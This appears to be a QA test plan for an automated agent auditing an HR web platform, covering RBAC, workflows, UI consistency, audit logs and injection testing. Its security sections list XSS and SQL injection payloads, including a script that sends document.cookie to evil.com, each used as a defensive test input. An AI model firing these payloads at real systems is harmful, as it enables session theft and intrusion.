login as role with explicit EMPLOYEE:READ permission
navigate → /employees
assert  → access granted (normalization working)
login as same role with employee.read in DB (not yet normalized)
assert  → same access result
```

**Feature flag RBAC:**

```
# SYS bypasses feature flags
toggle feature flag OFF for enable_leave
login as ESS → /leave → assert "Feature not available"
login as SYS → /leave → assert accessible (SYS bypasses @RequiresFeature)
toggle flag back ON
```

---

## CONSOLE & NETWORK AUDIT (After Every Action)

```
read_console_messages(onlyErrors: true, clear: true)
→ JS runtime errors (log source:line)
→ Unhandled promise rejections
→ React key / hook / deprecated API warnings

read_network_requests(urlPattern: '/api/', clear: true)
→ 4xx: log method + endpoint + status
→ 5xx: Critical severity bug
→ Missing Authorization header: Critical RBAC bug
→ Response > 3000ms: Performance flag
→ Content-Type: text/html on /api/ endpoint: server 500 indicator
→ Payload with cross-tenant or cross-user data: Critical
→ 429 on non-rate-limited endpoint: unexpected throttle bug
```

---

## BUG REPORT — EXCEL OUTPUT

### Output Path

```
/Users/fayaz.m/IdeaProjects/nulogic/nu-aura/qa-reports/qa-report-YYYY-MM-DD-HHmm.xlsx
```

### Sheets

**Sheet 1 — Summary**
Total bugs | by severity | pages tested | pass rate | timestamp | git hash

**Sheet 2 — Bug Report (Columns A–T)**

```
A  Bug ID          → BUG-001...
B  Sub-App         → NU-HRMS / NU-Hire / NU-Grow / NU-Fluence
C  Module          → Employees / Leave / Payroll / Feed / etc.
D  Feature         → exact feature tested
E  Route           → /employees
F  API Endpoint    → POST /api/v1/employees
G  Role Tested     → ESS | MGR | HRA | REC | PAY | FIN | ITA | SYS | UNA
H  Bug Type        → Functional|Auth/RBAC|UI|Console|Network|A11y|Perf|Data
I  Severity        → Critical|High|Medium|Low
J  Title           → one-liner
K  Steps to Repro  → numbered
L  Expected        → what should happen
M  Actual          → what actually happens
N  Console Error   → exact error + source:line
O  Failed API      → METHOD /endpoint → status + body
P  Screenshot      → qa-reports/screenshots/BUG-NNN.png
Q  GIF             → qa-reports/gifs/BUG-NNN.gif (Critical/High only)
R  Suspect File    → frontend/app/employees/page.tsx
S  Fix Status      → Open
T  Fix Notes       → (blank — developer fills)
```

**Sheet 3 — RBAC Matrix**
Rows = routes, Cols = 9 roles, Cells = ✅/🔒/❌/⚠️/⬜

**Sheet 4 — Flow Coverage**

```
Module | Feature | Happy Path | Invalid Path | RBAC | A11y | Responsive | Bugs | Status
```

**Sheet 5 — API Health**

```
Endpoint | Method | Expected Status | Actual Status | Response Time | Errors Found
```

**Sheet 6 — Infrastructure**

```
Service | Check | Expected | Actual | Status
Kafka   | DLQ empty | 0 failed events | ...
MinIO   | Upload/download | 200/201 | ...
ES      | Search latency | < 2s | ...
WS      | Connection | active | ...
Jobs    | Last run | within SLA | ...
Redis   | Cache consistency | synced | ...
```

**Sheet 7 — E2E Workflows**

```
Workflow | Steps Completed | Steps Failed | Blocking Bug | Status
Hire-to-Retire | 14/14 | 0 | — | PASS
Expense-to-Payroll | 4/4 | 0 | — | PASS
Leave-to-Payroll | 5/5 | 0 | — | PASS
Approval Delegation | 3/3 | 0 | — | PASS
```

**Sheet 8 — UI/UX Deep Audit**

```
Page | Dark Mode | Responsive 375px | Responsive 768px | A11y Critical | Typography | Spacing | Focus Rings | Status
/dashboard | ✅ | ✅ | ✅ | 0 | ✅ | ✅ | ✅ | PASS
/employees | ✅ | ⚠️ table overflow | ✅ | 1 | ✅ | ✅ | ✅ | WARN
...
```

**Sheet 9 — Security Testing**

```
Test | Module | Payload | Expected | Actual | Severity | Status
XSS Stored | Feed Post | <script>alert(1)</script> | Sanitized | ... | Critical | ...
IDOR | Employees | /employees/[OTHER_ID] | 403 | ... | Critical | ...
JWT Tamper | Auth | Modified payload | 401 | ... | Critical | ...
CSRF | All mutations | Missing token | 403 | ... | Critical | ...
SQL Injection | Login | ' OR 1=1 -- | Blocked | ... | Critical | ...
```

### Formatting

```python
header_fill = PatternFill('solid', start_color='1e1b4b')
header_font = Font(bold=True, color='FFFFFF', name='Arial', size=11)
SEVERITY_COLORS = {
  'Critical': 'FF4444', 'High': 'FF8C00', 'Medium': 'FFC107', 'Low': 'B3D9FF'
}
sheet.freeze_panes = 'A2'
sheet.auto_filter.ref = sheet.dimensions
# auto-fit all columns to content width
```

After creating: `python scripts/recalc.py qa-reports/qa-report-[timestamp].xlsx`

---

## SEVERITY DEFINITIONS

| Level | Criteria | Examples |
|---|---|---|
| **Critical** | Security / RBAC bypass / data loss / crash | ESS sees another user's payslip; cross-tenant leak; white screen; 500 on auth; CORS allowing evil origin |
| **High** | Core flow broken / data not persisting / compliance broken | Leave submit silently fails; payroll calc wrong; approval not routing; Kafka DLQ has stuck events |
| **Medium** | Non-critical functional bug / visual regression / wrong data format | Search not filtering; ISO date shown raw; empty state missing; WebSocket not reconnecting |
| **Low** | Cosmetic / spacing / dark mode edge case / copy error | 4px padding off; tooltip typo; icon misaligned |

---

## CROSS-CUTTING TEST SUITE — END-TO-END WORKFLOWS

### E2E-1 — Hire-to-Retire Full Lifecycle

```
# Complete employee journey across all sub-apps
Step 1: POST job opening (REC) → /recruitment → create job
Step 2: Candidate applies → /careers → submit application
Step 3: Move through pipeline → Applied → Screening → Interview → Offer
Step 4: Send offer → /offer-portal → candidate accepts
Step 5: Preboarding triggers → /preboarding → document requests sent
Step 6: Onboarding checklist created → /onboarding → complete all items
Step 7: Employee record auto-created → /employees/[new-id] → verify profile populated
Step 8: Employee clocks in → /dashboard → Clock In → attendance record exists
Step 9: Employee applies leave → /leave → apply → MGR approves → balance deducted
Step 10: Performance review → /performance → self-assess → MGR reviews → cycle closes
Step 11: OKR created → /okr → key results tracked → progress updated
Step 12: Payroll run → /payroll → employee included → payslip generated with correct data
Step 13: Offboarding → /offboarding → initiate → checklist → clearance → deactivated
Step 14: Deactivated employee → login attempt → blocked

assert → audit log traces entire lifecycle (13+ entries)
assert → no orphaned records (employee deleted but leave/attendance remain)
assert → Kafka events fired for: hire, onboard, review, payroll, offboard
screenshot → e2e-hire-to-retire.png
```

### E2E-2 — Expense-to-Payroll Flow

```
Step 1: ESS submits expense → /expenses → create with receipt → "Pending"
Step 2: MGR approves → status "Approved"
Step 3: FIN processes reimbursement → linked to payroll
Step 4: Payroll run includes reimbursement → payslip shows expense reimbursement line item
assert → amount on payslip matches approved expense amount
assert → reimbursed expense cannot be resubmitted
```

### E2E-3 — Leave Impact on Attendance and Payroll

```
Step 1: ESS applies 2 days leave → approved
Step 2: Check attendance for those 2 days → marked as "On Leave" (not "Absent")
Step 3: Run payroll → LOP NOT deducted (approved leave, not absent)
Step 4: ESS is absent WITHOUT leave for 1 day
Step 5: Run payroll → LOP deducted for the 1 absent day
assert → leave days and absent days calculated independently
assert → payslip reflects correct working days, leave days, absent days
```

### E2E-4 — Approval Chain Delegation

```
Step 1: ESS submits leave → pending with MGR (step 1 approver)
Step 2: MGR delegates approval to another manager (if delegation supported)
Step 3: Delegated approver approves → leave status "Approved"
assert → audit trail shows delegation chain
assert → original MGR can see the delegated approval in history
# If delegation not supported, test manager-absent scenario:
Step 2 alt: MGR account deactivated/on leave → approval escalates to HRA
assert → approval does not get stuck permanently with absent approver
```

---

## CROSS-CUTTING TEST SUITE — FORM VALIDATION DEEP DIVE

### FORM-1 — Universal Form Checks (Apply to ALL forms)

```
For every form in the platform (employee create, leave apply, expense submit, etc.):

REQUIRED FIELDS:
  submit empty form → all required fields show inline error (red text below field)
  assert → error messages are specific ("First name is required", not just "Required")
  assert → first error field gets focus automatically
  assert → error count shown in form header or summary
  assert → errors clear when user starts typing in the field

INPUT TYPES:
  text field: paste text with HTML tags → tags stripped or escaped (no XSS)
  text field: paste 10,000 chars → max length enforced with char counter
  number field: enter "abc" → shows "Must be a number" error
  number field: enter "-5" where negative not allowed → validation error
  number field: enter "1.5" where integers only → validation error
  date field: type "32/13/2026" → "Invalid date" error
  date field: calendar picker respects min/max bounds
  email field: "test@" → validation error
  email field: "test@domain" → allowed or error (per RFC)
  phone field: "+91-12345-67890" → allowed with formatting
  dropdown: clear selection → required error if mandatory
  multi-select: select 0 items → required error if mandatory
  file upload: upload 0-byte file → error
  file upload: upload wrong MIME type → error
  rich text (Tiptap): submit empty editor → required error

FORM STATE:
  fill partially → navigate away → "Unsaved changes" warning (beforeunload)
  fill partially → browser back → warning shown
  fill form → lose internet → submit → offline error shown (not silent failure)
  submit → loading spinner on button → button disabled during submission
  submit → success → form resets or navigates away (not stale filled form)
  submit → API error → form stays filled (user data NOT lost)
  submit → API error → error message shown with retry option

ZOD VALIDATION:
  assert → all forms use React Hook Form + Zod (check for useForm + zodResolver in network/console)
  assert → validation runs on blur AND on submit (not only on submit)
  assert → no raw console.error from Zod schema mismatch
```

---

## CROSS-CUTTING TEST SUITE — MODAL & DIALOG VALIDATION

### MODAL-1 — Universal Modal Checks

```
For every modal/dialog in the platform (confirm delete, create entity, edit profile, etc.):

OPEN/CLOSE:
  assert → modal has semi-transparent backdrop overlay
  assert → click outside modal → closes (or stays open for critical actions with confirm)
  assert → Escape key closes modal
  assert → X button in corner closes modal
  assert → opening modal disables body scroll (no double-scroll)
  assert → closing modal re-enables body scroll

FOCUS:
  assert → focus trapped inside modal (Tab doesn't leave)
  assert → first interactive element focused on open
  assert → focus returns to trigger element on close

CONTENT:
  assert → modal title clearly states the action ("Delete Employee", "Apply Leave")
  assert → destructive actions have red/warning colored confirm button
  assert → confirm dialog shows the name of the item being affected
  assert → cancel button present and functional on all modals

ANIMATION:
  assert → modal fades/slides in (not instant appear)
  assert → modal fades/slides out on close
  assert → no layout shift in background when modal opens

MOBILE:
  resize to 375px → modal doesn't overflow screen
  assert → modal becomes full-width or bottom sheet on mobile
  assert → all buttons reachable with thumb (bottom of viewport)
```

---

## CROSS-CUTTING TEST SUITE — TABLE & DATA GRID VALIDATION

### TABLE-1 — Universal Table Checks

```
For every data table in the platform (employees, leave requests, attendance, payroll, etc.):

STRUCTURE:
  assert → column headers are sticky on vertical scroll
  assert → first column (name/ID) is sticky on horizontal scroll (if table is wide)
  assert → column widths accommodate content (no text overflow without ellipsis)
  assert → action column (Edit/Delete/View) always visible (not scrolled off-screen)
  assert → row hover highlight visible (subtle background change)
  assert → alternating row colors or divider lines for readability

SELECTION:
  assert → checkbox column present (if bulk actions available)
  assert → select all (header checkbox) selects current page only
  assert → selected count indicator shown ("3 selected")
  assert → bulk action buttons appear when items selected
  assert → deselect all clears count and hides bulk actions

EMPTY & LOADING:
  assert → SkeletonTable shown during load (matches column count)
  assert → EmptyState shown when no data (not blank table with just headers)
  assert → EmptyState has contextual message ("No employees found" not generic "No data")
  assert → filter that returns 0 results → "No results match your filters" + Clear Filters button

SORTING & FILTERING:
  assert → sort applies server-side (not just client-side first page)
  assert → active sort column has visual indicator (▲▼ icon)
  assert → only one sort active at a time (clicking new column clears previous)
  assert → filter controls visible above table
  assert → active filter count badge (e.g., "Filters (3)")
  assert → URL reflects filter/sort state (shareable filtered view)

RESPONSIVENESS:
  768px → table scrolls horizontally OR switches to card layout
  375px → card layout with key fields visible, expand for details
  assert → action buttons accessible on mobile (not hidden by scroll)
```

---

## CROSS-CUTTING TEST SUITE — TOAST & NOTIFICATION VALIDATION

### TOAST-1 — Universal Toast Checks

```
For every action that produces a toast notification:

APPEARANCE:
  assert → toast appears in consistent position (top-right or bottom-right)
  assert → toast has appropriate color: green (success), red (error), amber (warning), sky (info)
  assert → toast has icon matching type (checkmark, X, warning triangle, info circle)
  assert → toast message is specific ("Employee created successfully", not just "Success")
  assert → toast auto-dismisses after 3-5 seconds
  assert → toast has manual close (X) button
  assert → multiple toasts stack vertically (not overlap)

SCREEN READER:
  assert → toast container has role="status" or role="alert"
  assert → error toasts have role="alert" (announced immediately)
  assert → success toasts have role="status" (polite announcement)

ACTIONS:
  assert → error toasts persist longer (10s) or until manually dismissed
  assert → error toasts have "Retry" action button where applicable
  assert → clicking toast action navigates to relevant page (if applicable)
  assert → toast does NOT block interaction with page below
```

---

## CROSS-CUTTING TEST SUITE — REDIS CACHE VALIDATION

### CACHE-1 — Permission Cache Consistency

```
# Verify Redis cache and DB stay in sync
login as HRA → note permissions
navigate → /admin/roles → modify HRA permissions (remove one permission)
logout → login again as HRA
assert → removed permission is actually gone (cache refreshed on login)
assert → page/feature gated by removed permission → 403

# Cache flush scenario
simulate Redis flush (if possible from admin)
perform an action requiring permission check
assert → permissions re-loaded from DB (slight latency acceptable, < 2s)
assert → no 403 errors for valid permissions during cache rebuild
assert → no 500 errors from missing cache
```

### CACHE-2 — Rate Limit State

```
# Verify rate limits are tracked in Redis
make 95 API calls → assert all return 200
make 6 more calls → assert 429 returned at call 101 (100/min API limit)
wait 60 seconds → make another call → 200 (counter reset)
assert → rate limit headers present: X-RateLimit-Remaining, X-RateLimit-Reset
assert → 429 response body has informative message (not empty body)
```

---

## CROSS-CUTTING TEST SUITE — AUDIT TRAIL COMPLETENESS

### AUDIT-1 — Audit Log Coverage

```
For EACH of these critical actions, verify an audit log entry is created:

Auth:
  login success → audit entry (user_id, action: LOGIN, ip_address, timestamp)
  login failure → audit entry (email, action: LOGIN_FAILED)
  logout → audit entry (action: LOGOUT)
  password change → audit entry (action: PASSWORD_CHANGED)

Employee:
  create employee → audit (action: EMPLOYEE_CREATED, resource_id: new_employee_id)
  update employee → audit (action: EMPLOYEE_UPDATED, description: changed fields)
  deactivate → audit (action: EMPLOYEE_DEACTIVATED)

Leave:
  apply → audit (action: LEAVE_REQUESTED)
  approve → audit (action: LEAVE_APPROVED, approver user_id)
  reject → audit (action: LEAVE_REJECTED, reason in description)

Payroll:
  run payroll → audit (action: PAYROLL_RUN, employee count, total amount)
  download payslip → audit (action: PAYSLIP_DOWNLOADED)

Admin:
  role change → audit (action: ROLE_MODIFIED)
  permission toggle → audit (action: PERMISSION_MODIFIED)
  feature flag toggle → audit (action: FEATURE_FLAG_TOGGLED)
  setting change → audit (action: SETTING_CHANGED, before/after values)

navigate → /admin/audit
assert → all above actions present with correct metadata
assert → audit entries are immutable (no edit/delete buttons on audit records)
assert → audit entries include IP address and user agent
assert → timestamp is server-side (not client-side — no spoofing)
assert → cross-tenant: audit entries for Tenant A not visible when logged into Tenant B
screenshot → audit-trail-complete.png
```

---

## CROSS-CUTTING TEST SUITE — STATE MANAGEMENT VALIDATION

### STATE-1 — Zustand Auth Store Consistency

```
javascript_tool:
  // Inspect Zustand auth store state
  const store = window.__ZUSTAND_DEVTOOLS__ || {};
  console.log('Auth store:', JSON.stringify(store.auth || {}));

assert → store contains: user object, roles array, permissions array, tenant_id
assert → permissions array matches what backend returns for this role
assert → after logout: store is completely cleared (no stale user data)
assert → after role switch (SYS→ESS): permissions array is the new role's set (not merged)
assert → store.user.id matches JWT payload sub claim
```

### STATE-2 — React Query Cache Behavior

```
navigate → /employees (first load)
read_network_requests → GET /api/v*/employees → 200 (network call made)
navigate → /dashboard → navigate back to /employees
read_network_requests → check if GET /api/v*/employees made again:
  if staleTime not expired → NO network call (served from cache) ✅
  if staleTime expired → new network call ✅
  if staleTime = 0 → always refetches ✅ (but check it's not excessive)

Mutation invalidation:
  create employee → POST succeeds
  assert → /employees list automatically refetches (cache invalidated)
  assert → new employee appears in list WITHOUT manual refresh
```

---

## CROSS-CUTTING TEST SUITE — UI/UX CONSISTENCY AUDIT (Run Across ALL Modules)

### UIUX-1 — Visual Regression Baseline

```
For EACH of these 15 key pages, capture a screenshot in BOTH light and dark mode at 1280×900:
  /dashboard, /employees, /employees/[id], /leave, /attendance, /payroll,
  /recruitment, /performance, /okr, /expenses, /assets, /admin, /settings,
  /fluence/wiki, /me/profile

Compare against design system rules:
  assert → primary CTA is sky-700 (not purple, not blue-600, not teal)
  assert → card border-radius: 8px (rounded-lg) consistently
  assert → card shadow: shadow-sm in light, shadow-none or shadow-md in dark
  assert → section titles use h2 with font-semibold
  assert → page titles use h1 with font-bold
  assert → no two adjacent buttons with same visual weight (one primary, one secondary)
  assert → destructive buttons (delete, deactivate) are red-600, not primary sky
  assert → cancel buttons are ghost/outline (not filled)
  assert → spacing between page title and first content section: 24px
screenshot → visual-regression-[page]-light.png, visual-regression-[page]-dark.png
```

### UIUX-2 — Component Consistency Across Modules

```
# Verify same component looks identical across different modules

BUTTONS — compare across 5 modules:
  /employees (Add Employee), /leave (Apply Leave), /expenses (Submit Expense),
  /recruitment (Post Job), /performance (Start Review)
  assert → all primary buttons: same height (40px), same font-size, same padding
  assert → all primary buttons: sky-700 bg, white text, rounded-md
  assert → all primary buttons: same hover effect (sky-800)
  assert → all disabled buttons: same opacity (0.5), same cursor (not-allowed)
  assert → all icon+text buttons: icon 20px, 8px gap, text same size
  screenshot → button-consistency-montage.png

CARDS — compare across 5 modules:
  /dashboard (stat cards), /employees (profile card), /leave (balance cards),
  /payroll (run summary), /performance (review card)
  assert → all cards: same border-radius, same shadow, same padding
  assert → all cards: same bg (white light / Slate 800 dark)
  assert → all cards: same header font-weight and size
  assert → card footer actions: consistently right-aligned
  screenshot → card-consistency-montage.png

TABLES — compare across 5 modules:
  /employees, /attendance, /leave/requests, /expenses, /recruitment
  assert → all tables: same header bg color and font-weight
  assert → all tables: same row height (52-56px)
  assert → all tables: same cell padding
  assert → all tables: same action column position (last column)
  assert → all tables: same hover row highlight color
  assert → all tables: same pagination component (same styling)
  assert → all tables: same empty state component
  screenshot → table-consistency-montage.png

FORMS — compare across 5 modules:
  employee create, leave apply, expense submit, job post, OKR create
  assert → all form labels: same font-size, same color, same position (above input)
  assert → all text inputs: same height (40px), same border-radius, same border-color
  assert → all required field indicators: same style (red asterisk or "Required" text)
  assert → all validation errors: same red color, same font-size, same position (below input)
  assert → all form footers: Cancel (ghost) + Submit (primary), right-aligned
  assert → all date pickers: same component (Mantine DatePicker)
  assert → all dropdowns: same component (Mantine Select)
  screenshot → form-consistency-montage.png

BADGES — compare across all modules:
  employee status, leave status, expense status, recruitment pipeline, approval status
  assert → all badges: same border-radius (rounded-full or rounded-md)
  assert → all badges: same font-size (12px or 14px)
  assert → all badges: same semantic colors (green=active/approved, red=rejected, yellow=pending)
  assert → no module using custom badge colors outside the design system
  screenshot → badge-consistency-montage.png
```

### UIUX-3 — Interaction Pattern Consistency

```
# Verify same interaction works identically across modules

CREATE FLOW:
  /employees → Add Employee → form → Save → toast → list updated
  /expenses → Submit Expense → form → Save → toast → list updated
  /leave → Apply Leave → form → Submit → toast → list updated
  assert → all create flows: same button label pattern ("Add X" or "Create X" or "Submit X")
  assert → all create flows: form opens as modal OR full page (not inconsistent)
  assert → all create flows: success toast with same styling
  assert → all create flows: redirect to list with new item visible

EDIT FLOW:
  /employees/[id] → Edit → form pre-populated → Save → toast
  /expenses/[id] → Edit → form pre-populated → Save → toast
  assert → all edit flows: form opens with existing data pre-filled
  assert → all edit flows: Save button disabled until changes detected
  assert → all edit flows: "Unsaved changes" warning on navigate away
  assert → all edit flows: Cancel reverts all changes (no partial save)

DELETE FLOW:
  /employees → Delete → confirm dialog → toast → removed from list
  /expenses → Delete → confirm dialog → toast → removed from list
  assert → all delete flows: confirmation dialog (NEVER direct delete)
  assert → all delete dialogs: show item name being deleted
  assert → all delete dialogs: destructive button red, cancel button ghost
  assert → all delete dialogs: "Delete" text on button (not "OK" or "Yes")
  assert → all delete flows: success toast "X deleted successfully"
  assert → all delete flows: item removed from list without full page reload

APPROVAL FLOW:
  /approvals → leave request → Approve → toast → status updated
  /approvals → expense request → Approve → toast → status updated
  assert → all approval flows: same approve/reject button pair
  assert → all reject flows: require reason (mandatory text field)
  assert → all approval flows: status badge updates immediately
  assert → all approval flows: notification sent to requester
```

### UIUX-4 — Whitespace & Visual Hierarchy Audit

```
# Run on key pages to ensure proper visual hierarchy

navigate → /dashboard
assert    → clear visual hierarchy: greeting (largest) → stat cards → widgets → feed
assert    → adequate whitespace between sections (not cramped)
assert    → no "orphaned" elements (single item on a wide row)
assert    → page feels balanced (left/right content roughly equal weight)

navigate → /employees/[id] (profile page)
assert    → hero section: avatar + name + role prominently displayed
assert    → tabs below hero: clearly secondary to hero
assert    → tab content: tertiary visual weight
assert    → action buttons (Edit, Deactivate): visible but not competing with name

navigate → /payroll/runs/[id] (payroll detail)
assert    → summary totals: largest/boldest (primary focus)
assert    → per-employee breakdown: secondary
assert    → action buttons: tertiary
assert    → no important information hidden below the fold without scroll indicator

# Density Check
assert    → information density: moderate (not too sparse, not overwhelming)
assert    → stat cards: 3-4 per row max (not 6+ crammed)
assert    → table rows: readable without squinting (row height ≥ 48px)
assert    → form fields: adequate vertical spacing (16px gap minimum)
assert    → sidebar items: not cramped (each item ≥ 40px height)
screenshot → visual-hierarchy-dashboard.png, visual-hierarchy-profile.png
```

### UIUX-5 — Loading & Perceived Performance UX

```
# Skeleton Fidelity Check
navigate → /employees (with network throttle: Slow 3G)
assert    → SkeletonTable matches final table structure:
           same number of columns, same column widths, same row count
assert    → skeleton shimmer direction: left-to-right (consistent)
assert    → skeleton animation: smooth, not jittery (60fps)
assert    → skeleton bg: neutral gray in light mode, Slate 700 in dark mode
assert    → content replaces skeleton in-place (no layout shift — CLS = 0)

navigate → /dashboard (with network throttle)
assert    → SkeletonStatCard: matches final card shape (same border-radius, height)
assert    → stat cards load independently (one card can show data while another still loading)
assert    → greeting loads first (instant), widgets load after API response

# Progressive Loading
navigate → /employees/[id] (profile with many tabs)
assert    → hero section (name, avatar) loads first
assert    → active tab content loads next
assert    → inactive tab content loads lazily (only when clicked)
assert    → no waterfall loading (tab A → tab B → tab C sequentially)

# Optimistic UI Feedback
click     → any toggle/switch → UI updates IMMEDIATELY (before API response)
click     → any approve button → status badge changes IMMEDIATELY
click     → any like/react button → count increments IMMEDIATELY
if API fails → roll back with error toast + revert UI state
assert    → user never waits > 100ms for visual feedback on click
```

### UIUX-6 — Error State UX Quality

```
# API Error States (simulate with network offline or server stop)
navigate → /employees → simulate API 500
assert    → error UI component rendered (not blank page or raw JSON)
assert    → error message: "Something went wrong" (not stack trace)
assert    → error illustration: themed to NU-AURA (not generic browser error)
assert    → "Retry" button present → click → re-fetches
assert    → header + sidebar still visible (partial page error, not full crash)
assert    → URL doesn't change (still on /employees, not redirected)
screenshot → error-state-api.png

# Timeout State
simulate  → network throttle to offline after 10s
assert    → timeout message appears: "Request timed out"
assert    → "Retry" button present
assert    → page doesn't hang indefinitely (max 15s timeout)

# Partial Data Error
simulate  → /dashboard where 3 of 5 widget APIs fail
assert    → successful widgets render normally
assert    → failed widgets show individual error states (not entire page error)
assert    → each failed widget has its own "Retry" button
assert    → failed widgets don't break layout (maintain height/width of successful ones)

# Form Submission Error
fill      → employee form → submit → simulate 422 Validation Error
assert    → form stays filled (user data NOT lost)
assert    → server-side validation errors mapped to correct fields
assert    → scroll to first error field automatically
assert    → error toast shown WITH specific message (not generic "Error")
assert    → submit button re-enabled (user can fix and retry)

# Network Reconnection
simulate  → go offline → show offline banner → go online
assert    → "You're back online" success banner/toast appears
assert    → stale data auto-refreshes on reconnection
assert    → pending mutations retry automatically (or prompt user)
screenshot → error-state-partial.png, error-state-form.png
```

### UIUX-7 — Feedback & Confirmation Patterns

```
# Success Feedback
create employee → assert: green toast "Employee created successfully" + checkmark icon
approve leave → assert: green toast "Leave request approved" + checkmark icon
assert    → toast shows for 3-5 seconds, auto-dismisses
assert    → multiple toasts stack vertically (newest on top)

# Destructive Action Confirmation
delete employee → assert: confirmation dialog appears
assert    → dialog title: "Delete Employee?" (question format)
assert    → dialog body: "Are you sure you want to delete [Name]? This action cannot be undone."
assert    → dialog body includes the specific item name (not generic)
assert    → buttons: "Cancel" (left/ghost) + "Delete" (right/red)
assert    → pressing Escape = Cancel (does NOT proceed with delete)
assert    → clicking backdrop = Cancel
assert    → Tab focus starts on Cancel (safe default), not Delete

# Bulk Action Confirmation
select 10 employees → Bulk Deactivate → confirm dialog
assert    → dialog shows count: "Deactivate 10 employees?"
assert    → consequence explained: "These employees will lose access to the platform"
assert    → progress indicator during bulk operation (not just spinner)
assert    → completion summary: "10 of 10 employees deactivated successfully"

# Inline Editing Confirmation
edit employee phone inline → change → click away
assert    → auto-save with subtle feedback (checkmark or green flash)
        OR "Save" button required (not silent auto-save without feedback)
assert    → user ALWAYS knows whether change was saved (never ambiguous)

# Undo Support
delete announcement → toast "Announcement deleted" with "Undo" link
click Undo within 5s → announcement restored
assert    → undo window: 5-10 seconds (not instant permanent delete)
screenshot → confirmation-dialog.png, success-toast.png
```

### UIUX-8 — Navigation & Wayfinding

```
# User Always Knows Where They Are
navigate → 10 random pages
For each page:
  assert → page title in browser tab matches page content
  assert → breadcrumb trail shows current location
  assert → sidebar active item matches current route
  assert → URL is human-readable (not /page?id=abc123)

# User Can Always Get Back
From any page:
  assert → browser back button works (doesn't break SPA routing)
  assert → breadcrumb parent is clickable (navigate up)
  assert → logo/home link returns to /dashboard
  assert → sidebar is always accessible (not hidden without hamburger on desktop)

# Deep Linking
copy URL from /employees/[id] → paste in new incognito tab → login
assert    → after login, redirected to /employees/[id] (not /dashboard)
assert    → all URL state preserved (filters, sort, page number in URL params)

# 404 / Dead End Prevention
navigate → /employees/999999 (non-existent ID)
assert    → "Employee not found" page with navigation options (not dead end)
assert    → "Go to Employees" link present → works
assert    → browser back button still works from 404 page

# Navigation Consistency
assert    → primary navigation (sidebar) same on ALL pages (never hidden)
assert    → secondary navigation (breadcrumbs) same pattern on ALL pages
assert    → action buttons (Create, Edit, Delete) same position on ALL pages
assert    → back buttons (← Back to List) same position and style everywhere
screenshot → wayfinding-audit.png
```

### UIUX-9 — Responsive Image & Avatar Handling

```
# Avatar Component
navigate → /employees
assert    → avatars: circular, consistent size (40px in list, 80px in profile)
assert    → avatars: show initials when no photo uploaded (first + last initial)
assert    → initials: consistent bg color per employee (deterministic from name hash)
assert    → photo avatars: properly cropped (object-fit: cover, no distortion)
assert    → broken image URL: falls back to initials (not broken image icon)
assert    → avatar ring: indicates online status (if feature exists)

# Image Loading
assert    → profile photos: loading="lazy" attribute present
assert    → images: proper aspect-ratio maintained (no squishing)
assert    → large images: compressed/resized (not serving 4000px photo for 80px avatar)
assert    → image loading: placeholder shimmer while loading (not empty square)

# File Thumbnails
navigate → /nu-drive
assert    → PDF files: PDF icon thumbnail (not generic file icon)
assert    → Image files: actual image preview thumbnail
assert    → DOCX files: Word icon thumbnail
assert    → XLSX files: Excel icon thumbnail
assert    → Unknown types: generic file icon with extension label
assert    → thumbnails: consistent size and border-radius
screenshot → avatar-consistency.png, file-thumbnails.png
```

### UIUX-10 — Chart & Data Visualization Quality

```
navigate → /dashboard → stat cards and charts
navigate → /analytics → analytics dashboard
navigate → /reports → generated reports with charts

# Recharts Rendering
assert    → bar charts: bars visible, correct height proportional to data
assert    → pie/donut charts: slices proportional, labels readable
assert    → line charts: smooth curves, data points visible on hover
assert    → no blank/empty chart containers (show "No data" instead)
assert    → chart legends: present, clickable (toggle series visibility)
assert    → chart tooltips: show on hover, formatted values (not raw numbers)
assert    → chart axis labels: readable (not overlapping, not cut off)
assert    → chart colors: from design system palette (not random/default Recharts)

# Chart Responsiveness
resize_window → 375 × 812
assert    → charts scale down proportionally
assert    → chart legends move below chart (not overlay data)
assert    → axis labels remain readable (font-size ≥ 10px)
assert    → no chart overflow (clipped by container)

# Chart Dark Mode
toggle dark mode
assert    → chart bg transparent or matches dark card bg
assert    → axis lines/labels adapt to light colors
assert    → grid lines subtle (not bright white on dark bg)
assert    → tooltip bg: dark with light text (inverted from light mode)

# Chart Accessibility
assert    → charts have aria-label describing the data
assert    → chart data available in tabular format for screen readers (if supported)
assert    → color is NOT the only differentiator (patterns or labels supplement color)
screenshot → charts-light.png, charts-dark.png, charts-mobile.png
```

---

## CROSS-CUTTING TEST SUITE — XSS & INJECTION DEEP TESTING

### XSS-1 — Stored XSS via User-Generated Content

```
For EACH text input that stores and displays content (feed posts, wiki pages, blog posts,
  comments, announcements, helpdesk tickets, expense descriptions, leave reasons):

Test payload: <img src=x onerror="alert('XSS')">
Test payload: <script>document.location='http://evil.com?c='+document.cookie</script>
Test payload: javascript:alert('XSS')
Test payload: "><img src=x onerror=alert(1)>
Test payload: {{constructor.constructor('return this')()}}

fill → content field with XSS payload → Submit → view the saved content
assert → payload is sanitized or escaped in rendered HTML
assert → no alert dialog appears
assert → no script execution in console
assert → HTML tags rendered as text (not interpreted)
assert → Tiptap editor sanitizes on input AND on render

Special case — Markdown rendering:
fill → [Click me](javascript:alert('XSS'))
assert → link is stripped or href sanitized to # or removed

Special case — SVG injection:
fill → <svg onload="alert('XSS')">
assert → SVG event handlers stripped
```

### XSS-2 — URL Parameter Injection

```
navigate → /employees?search=<script>alert(1)</script>
assert → search term rendered as text, not executed
assert → URL parameters are sanitized before display

navigate → /employees?sort=<img onerror=alert(1) src=x>
assert → sort parameter validated against allowed values, injection ignored

navigate → /dashboard?redirect=javascript:alert(1)
assert → redirect param validated against same-origin only
```

---

## CROSS-CUTTING TEST SUITE — TIPTAP RICH TEXT EDITOR DEEP TESTING

### TIPTAP-1 — Editor Rendering & Formatting

```
# Tiptap (17 extensions) used in: wiki pages, blog posts, letter templates, announcements, helpdesk tickets
# Test in EACH editor instance

navigate → any Tiptap editor (e.g., /fluence/wiki → New Page)

# Basic Formatting
type "Hello World" → select "Hello" → click Bold → assert bold rendered (<strong> or font-weight)
select "World" → click Italic → assert italic rendered (<em>)
select text → click Underline → assert underline
select text → click Strikethrough → assert strikethrough
assert → toolbar shows active formatting state (Bold button highlighted when cursor in bold text)

# Headings
type on new line → select Heading 1 from dropdown → text becomes h1
type on new line → select Heading 2 → text becomes h2
type on new line → select Heading 3 → text becomes h3
assert → heading sizes visually descend (h1 > h2 > h3)
assert → heading renders in preview/saved output (not just editor)

# Lists
click Bullet List → type items → Enter for new item → nested indent with Tab
